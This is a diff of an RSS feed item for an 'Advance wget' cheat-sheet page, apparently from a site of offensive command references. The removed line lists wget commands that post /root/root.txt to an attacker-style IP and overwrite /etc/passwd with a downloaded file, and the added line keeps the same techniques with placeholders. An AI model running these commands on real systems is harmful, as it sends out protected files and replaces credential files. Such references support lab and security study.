@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/advance_wget/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/advance_wget/</guid>
-      <description> Advance wget # Provide a file with urls wget --input-file /root/root.txt # POST a file wget --post-file /root/root.txt http://10.10.14.10 # Overwrite a file wget http://10.10.14.10/passwd.txt -O /etc/passwd </description>
+      <description>Advance wget # Provide a file with urls wget --input-file &amp;lt;FILE_PATH&amp;gt; # POST a file wget --post-file &amp;lt;FILE_PATH&amp;gt; &amp;lt;TARGET&amp;gt; # Overwrite a file wget &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; -O &amp;lt;FILE_PATH&amp;gt; </description>
     </item>
   </channel>
 </rss>
